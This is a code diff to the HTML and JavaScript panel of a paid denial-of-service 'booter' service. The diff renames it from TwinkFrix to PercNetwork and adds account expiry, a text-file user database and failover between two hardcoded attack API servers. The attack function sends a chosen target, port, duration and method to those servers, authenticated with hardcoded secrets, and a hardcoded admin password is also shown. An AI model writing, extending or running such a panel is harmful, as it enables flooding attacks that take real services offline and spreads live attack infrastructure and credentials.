@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TwinkFrix // Elite Panel</title>
+    <title>PercNetwork // Elite Panel</title>
     <style>
         :root {
             --bg-dark: #050505;
@@ -76,6 +76,9 @@
         .badge-admin { color: var(--error-red); font-weight: bold; text-transform: uppercase; }
         .badge-vip { color: var(--vip-gold); font-weight: bold; text-transform: uppercase; }
         .badge-free { color: var(--text-muted); font-weight: bold; text-transform: uppercase; }
+        .badge-expired { color: var(--error-red); font-weight: bold; text-transform: uppercase; animation: pulse 2s infinite; }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
         .form-group { margin-bottom: 1.5rem; }
         label { display: block; margin-bottom: 0.5rem; font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; }
@@ -150,8 +153,8 @@
 
 <div class="container">
     <div class="header-section panel">
-        <h1>TwinkFrix // Elite</h1>
-        <div class="user-status" id="statusDisplay">Guest Access</div>
+        <h1>PercNetwork // Elite</h1>
+        <div class="user-status" id="statusDisplay">Loading Database...</div>
     </div>
 
     <!-- Login/Register Section -->
@@ -178,6 +181,10 @@
             <div class="form-group">
                 <label>New Password</label>
                 <input type="password" id="regPass" placeholder="Choose password">
+            </div>
+            <div class="form-group">
+                <label>Days (-1 for Infinite)</label>
+                <input type="number" id="regDays" value="-1">
             </div>
             <button onclick="handleRegister()">Register</button>
         </div>
@@ -238,6 +245,10 @@
                 </select>
             </div>
             <input type="password" id="admNewPass" placeholder="Password" style="margin-top:5px;">
+            <div class="form-group" style="margin-top:5px;">
+                <label>Days (-1 for Infinite)</label>
+                <input type="number" id="admNewDays" value="-1">
+            </div>
             <button onclick="adminCreateUser()" style="margin-top:10px;">Create</button>
         </div>
 
@@ -249,6 +260,7 @@
                 <tr>
                     <th>User</th>
                     <th>Tier</th>
+                    <th>Expires</th>
                     <th>Status</th>
                     <th>Actions</th>
                 </tr>
@@ -259,30 +271,80 @@
 </div>
 
 <script>
-    // API Configuration (Hardcoded Global Secret)
-    const API_BASE = "http://191.217.203.207:9000/api/attack";
+    // API Configuration (Dual Node with Failover)
+    const API_NODES = [
+        "http://191.217.203.207:9000/api/attack",
+        "http://78.17.212.44:9000/api/attack"
+    ];
+    
     const API_USER = "twinkfrix";
     const API_SECRET = "19012hack";
 
     // Local Storage Config
     const ADMIN_USER = 'admin';
-    const ADMIN_PASS = '362gdd8h3'; // Changed as requested previously
+    const ADMIN_PASS = '362gdd8h3';
 
     let currentUser = null;
     let usersDB = {};
     
-    function initDB() {
-        const stored = localStorage.getItem('twinkfrix_users');
-        if (stored) {
-            usersDB = JSON.parse(stored);
-        } else {
-            usersDB[ADMIN_USER] = { pass: ADMIN_PASS, tier: 'ADMIN', banned: false };
-            saveDB();
+    // Load DB from file (PercNetwork Format: user:pass:days)
+    async function initDB() {
+        try {
+            const response = await fetch('database.txt');
+            if (!response.ok) throw new Error("DB file not found");
+            const text = await response.text();
+            const lines = text.split('\n');
+            
+            usersDB = {}; // Reset
+            
+            lines.forEach(line => {
+                const parts = line.trim().split(':');
+                if (parts.length >= 3) {
+                    const username = parts[0];
+                    const password = parts[1];
+                    const daysStr = parts[2];
+                    const days = parseInt(daysStr);
+                    
+                    // Calculate expiry
+                    let expiry = null;
+                    if (days !== -1) {
+                        const now = new Date();
+                        now.setDate(now.getDate() + days);
+                        expiry = now.getTime();
+                    }
+
+                    usersDB[username] = { 
+                        pass: password, 
+                        tier: 'VIP', // Default to VIP for imported accounts or detect from name? Let's stick to VIP for simplicity or parse name.
+                        banned: false,
+                        expiry: expiry
+                    };
+                }
+            });
+
+            // Ensure admin exists
+            if (!usersDB[ADMIN_USER]) {
+                usersDB[ADMIN_USER] = { pass: ADMIN_PASS, tier: 'ADMIN', banned: false, expiry: null };
+                log("Admin account created in memory.", "info");
+            }
+            saveDB(); 
+        } catch (e) {
+            console.error("Failed to load database.txt, using fallback/local", e);
+            const stored = localStorage.getItem('percnetwork_users');
+            if (stored) {
+                usersDB = JSON.parse(stored);
+            } else {
+                usersDB[ADMIN_USER] = { pass: ADMIN_PASS, tier: 'ADMIN', banned: false, expiry: null };
+                saveDB();
+            }
         }
+        renderMethods();
+        checkSession();
+        document.getElementById('statusDisplay').innerText = "Database Loaded";
     }
 
     function saveDB() {
-        localStorage.setItem('twinkfrix_users', JSON.stringify(usersDB));
+        localStorage.setItem('percnetwork_users', JSON.stringify(usersDB));
     }
 
     const methods = [
@@ -330,13 +392,17 @@
 
     window.onload = () => {
         initDB();
-        renderMethods();
-        checkSession();
     };
 
     function checkSession() {
-        const savedUser = sessionStorage.getItem('tf_user');
+        const savedUser = sessionStorage.getItem('pn_user');
         if (savedUser && usersDB[savedUser]) {
+            const userData = usersDB[savedUser];
+            // Check Expiry
+            if (userData.expiry && Date.now() > userData.expiry) {
+                log("Account expired.", "error");
+                return;
+            }
             loginSuccess(savedUser);
         }
     }
@@ -353,8 +419,14 @@
         if (!u || !p) return log("Fill all fields.", "error");
 
         if (usersDB[u]) {
-            if (usersDB[u].pass !== p) return log("Invalid credentials.", "error");
-            if (usersDB[u].banned) return log("Account is banned.", "error");
+            const userData = usersDB[u];
+            if (userData.pass !== p) return log("Invalid credentials.", "error");
+            if (userData.banned) return log("Account is banned.", "error");
+            
+            // Check Expiry
+            if (userData.expiry && Date.now() > userData.expiry) {
+                return log("Account has expired.", "error");
+            }
             
             loginSuccess(u);
         } else {
@@ -365,11 +437,19 @@
     function handleRegister() {
         const u = document.getElementById('regUser').value.trim();
         const p = document.getElementById('regPass').value;
+        const d = parseInt(document.getElementById('regDays').value);
 
         if (!u || !p) return log("Fill all fields.", "error");
         if (usersDB[u]) return log("User exists.", "error");
 
-        usersDB[u] = { pass: p, tier: 'FREE', banned: false };
+        let expiry = null;
+        if (d !== -1) {
+            const now = new Date();
+            now.setDate(now.getDate() + d);
+            expiry = now.getTime();
+        }
+
+        usersDB[u] = { pass: p, tier: 'FREE', banned: false, expiry: expiry };
         saveDB();
         log("Account created! Please login.", "success");
         toggleRegister();
@@ -377,7 +457,7 @@
 
     function loginSuccess(username) {
         currentUser = username;
-        sessionStorage.setItem('tf_user', username);
+        sessionStorage.setItem('pn_user', username);
         
         const userData = usersDB[username];
         
@@ -385,7 +465,17 @@
         if (userData.tier === 'VIP') badgeClass = 'badge-vip';
         if (userData.tier === 'ADMIN') badgeClass = 'badge-admin';
         
-        els.status.innerHTML = `Logged in as: <span class="${badgeClass}">${username}</span>`;
+        let expiryText = "Infinite";
+        if (userData.expiry) {
+            const date = new Date(userData.expiry);
+            expiryText = date.toLocaleDateString();
+            if (Date.now() > userData.expiry) {
+                badgeClass = 'badge-expired';
+                expiryText += " (EXPIRED)";
+            }
+        }
+
+        els.status.innerHTML = `Logged in as: <span class="${badgeClass}">${username}</span> <small>[${expiryText}]</small>`;
         
         els.authPanel.style.display = 'none';
         els.dashPanel.style.display = 'block';
@@ -403,7 +493,7 @@
 
     function logout() {
         currentUser = null;
-        sessionStorage.removeItem('tf_user');
+        sessionStorage.removeItem('pn_user');
         location.reload();
     }
 
@@ -483,14 +573,24 @@
 
         startTimer(duration);
 
-        // Construct URL using GLOBAL API credentials
-        const url = `${API_BASE}?username=${API_USER}&secret=${API_SECRET}&target=${target}&port=${port}&duration=${duration}&method=${selectedMethodId}`;
+        const baseParams = `?username=${API_USER}&secret=${API_SECRET}&target=${target}&port=${port}&duration=${duration}&method=${selectedMethodId}`;
+        
+        let success = false;
 
-        try {
-            await fetch(url, { mode: 'no-cors' });
-            log("Packet stream sent.", "success");
-        } catch (e) {
-            log("Network error (CORS?): " + e.message, "error");
+        for (const node of API_NODES) {
+            const url = node + baseParams;
+            try {
+                await fetch(url, { mode: 'no-cors' });
+                log(`Connection established via node: ${node.split('//')[1].split(':')[0]}`, "success");
+                success = true;
+                break;
+            } catch (e) {
+                log(`Node ${node.split('//')[1].split(':')[0]} failed, trying next...`, "error");
+            }
+        }
+
+        if (!success) {
+            log("All nodes unreachable.", "error");
             stopTimer();
             btn.disabled = false;
             btn.innerText = "INITIATE ATTACK";
@@ -536,17 +636,26 @@
         const u = document.getElementById('admNewUser').value.trim();
         const t = document.getElementById('admNewTier').value;
         const p = document.getElementById('admNewPass').value;
+        const d = parseInt(document.getElementById('admNewDays').value);
 
         if (!u || !p) return log("Admin: Fill details.", "error");
         if (usersDB[u]) return log("Admin: User exists.", "error");
 
-        usersDB[u] = { pass: p, tier: t, banned: false };
+        let expiry = null;
+        if (d !== -1) {
+            const now = new Date();
+            now.setDate(now.getDate() + d);
+            expiry = now.getTime();
+        }
+
+        usersDB[u] = { pass: p, tier: t, banned: false, expiry: expiry };
         saveDB();
         renderUserTable();
         log(`Admin: Created user ${u} (${t})`, "success");
         
         document.getElementById('admNewUser').value = '';
         document.getElementById('admNewPass').value = '';
+        document.getElementById('admNewDays').value = '-1';
     }
 
     function renderUserTable() {
@@ -555,6 +664,13 @@
             const data = usersDB[username];
             const tr = document.createElement('tr');
             
+            let expiryDisplay = "Infinite";
+            if (data.expiry) {
+                const date = new Date(data.expiry);
+                expiryDisplay = date.toLocaleDateString();
+                if (Date.now() > data.expiry) expiryDisplay += " <span style='color:red'>(EXP)</span>";
+            }
+
             let actionHtml = '';
             if (username !== currentUser) {
                 if (data.banned) {
@@ -569,6 +685,7 @@
             tr.innerHTML = `
                 <td>${username}</td>
                 <td><span class="badge-${data.tier.toLowerCase()}">${data.tier}</span></td>
+                <td>${expiryDisplay}</td>
                 <td>${data.banned ? '<span style="color:red">BANNED</span>' : '<span style="color:green">ACTIVE</span>'}</td>
                 <td class="user-actions">${actionHtml}</td>
             `;
